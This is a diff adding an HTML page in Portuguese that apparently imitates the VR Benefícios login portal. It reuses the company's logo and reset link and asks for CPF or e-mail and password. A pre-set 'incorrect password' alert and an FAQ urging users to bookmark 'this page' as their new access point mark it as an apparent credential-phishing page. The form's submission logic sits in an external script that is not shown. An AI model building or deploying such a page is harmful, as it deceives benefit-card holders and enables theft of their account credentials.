@@ -1,0 +1,87 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>VR - facilita a vida</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <main class="content">
+    <section class="login-panel" aria-label="Acesso VR">
+      <div class="login-box">
+        <header class="login-header">
+          <img class="logo" src="https://www.vr.com.br/sites/default/files/VR%20Benef%C3%ADcios.png" alt="VR Benefícios">
+          <h1>Informe os dados do seu Acesso VR para acessar os produtos.</h1>
+        </header>
+
+        <form class="login-form" id="submission-form" aria-label="Formulário de teste">
+          <!-- Alerta de erro de credenciais da VR -->
+          <div class="error-msg" id="login-erro" style="display: none; color: #ef4444; font-size: 13px; font-weight: 600; margin: 0 0 16px; text-align: left; align-items: center; gap: 8px; padding: 10px 14px; background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 8px;">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+            <span>E-mail ou senha incorretos. Verifique seus dados e tente novamente.</span>
+          </div>
+
+          <div class="field" id="field-nome">
+            <label for="identifier">CPF ou e-mail *</label>
+            <input id="nome" name="identificador" type="text" inputmode="text" autocomplete="username" required maxlength="254">
+          </div>
+          <div class="field" id="field-senha">
+            <label for="password">Senha *</label>
+            <input id="senha" name="senha" type="password" inputmode="text" autocomplete="current-password" required maxlength="120">
+          </div>
+          <a class="forgot-password" href="https://sso-acesso.vr.com.br/u/reset-password/request/VR-PF?state=hKFo2SBPaDZZU08zTXlUbUJpUHE3dmo5Ml9ITFczOFZmM05XZqFurnJlc2V0LXBhc3N3b3Jko3RpZNkgZi1FcEdMN2RuNUtkekx5dDNLRHdEWEtPRFZYSF9XTFajY2lk2SBLNHNCYmZVNUwzdFVwUU5PY3FZZzU5UDdNMjRLeW51TA">Redefinir senha</a>
+          <button id="continuar" class="continue-button" type="submit" disabled>Continuar</button>
+          <div class="alternate-action">Não tem uma conta?</div>
+          <p class="submission-status" id="submission-status" role="status" aria-live="polite"></p>
+        </form>
+      </div>
+    </section>
+
+    <aside class="banner" aria-label="Comunicação VR"></aside>
+  </main>
+
+  <footer class="footer">
+    <span>© 2026 VR - Todos os direitos reservados</span>
+    <div class="help">
+      <span class="help-icon">?</span>
+      <a href="#ajuda-modal">Ajuda</a>
+    </div>
+  </footer>
+
+  <section id="ajuda-modal" class="help-modal" aria-label="Perguntas frequentes">
+    <div class="ajuda-dialog">
+      <a class="close-modal" href="#">×</a>
+      <div class="ajuda-header">
+        <p class="ajuda-title">Perguntas frequentes</p>
+        <p class="ajuda-subtitle">Clique na pergunta para ler as instruções que precisa</p>
+      </div>
+      <div class="ajuda-accordion">
+        <details><summary>Esqueci minha senha. Como redefinir?</summary><p>Na página de login, clique em “Esqueci minha senha” e siga as instruções exibidas na tela.</p></details>
+        <details><summary>Qual é meu usuário para login?</summary><p>Você pode utilizar seu CPF ou seu e-mail cadastrado.</p></details>
+        <details><summary>Não recebi meu código de verificação. O que fazer?</summary><p>Verifique sua caixa de spam ou a pasta de mensagens indesejadas do celular.</p></details>
+        <details><summary>Por que preciso receber um código de verificação?</summary><p>O código é essencial para garantir a sua segurança e a proteção dos dados acessados no portal.</p></details>
+        <details><summary>Não tenho uma conta. O que devo fazer?</summary><p>Entre em contato com a pessoa responsável pelas soluções VR na sua empresa.</p></details>
+        <details><summary>Eu costumava acessar por outra página. Ainda posso continuar usando a antiga?</summary><p>Seu acesso passa a acontecer sempre por essa página. Salve este link nos seus favoritos.</p></details>
+      </div>
+    </div>
+  </section>
+
+  <aside class="accessibility-widget" aria-label="Plugin de acessibilidade da Hand Talk.">
+    <button class="accessibility-button" type="button" aria-label="Abrir recursos assistivos.">
+      <svg width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" fill="currentColor">
+        <path d="M20.75 6.99C20.61 6.44 20.06 6.12 19.51 6.24C17.13 6.77 14.48 7 12 7C9.52 7 6.87 6.77 4.49 6.24C3.94 6.12 3.39 6.44 3.25 6.99C3.11 7.55 3.45 8.12 4 8.25C5.61 8.61 7.35 8.86 9 9V21C9 21.55 9.45 22 10 22C10.55 22 11 21.55 11 21V16H13V21C13 21.55 13.45 22 14 22C14.55 22 15 21.55 15 21V9C16.65 8.86 18.39 8.61 19.99 8.25C20.55 8.12 20.89 7.55 20.75 6.99ZM12 6C13.1 6 14 5.1 14 4C14 2.9 13.1 2 12 2C10.9 2 10 2.9 10 4C10 5.1 10.9 6 12 6Z" />
+      </svg>
+      <span>Recursos Assistivos</span>
+    </button>
+    <button class="accessibility-button" type="button" aria-label="Abrir tradutor de língua de sinais.">
+      <svg width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" fill="currentColor">
+        <circle cx="12" cy="4" r="2" />
+        <path d="M8 8.5C8 7.67 8.67 7 9.5 7h5c.83 0 1.5.67 1.5 1.5V11h2v2h-3v-2h-1v10h-2v-6h-1v6H9V11H7v2H5v-2h3V8.5Z" />
+      </svg>
+      <span>Acessível em Libras</span>
+    </button>
+  </aside>
+  <script src="script.js?v=20260905_1911"></script>
+</body>
+</html>
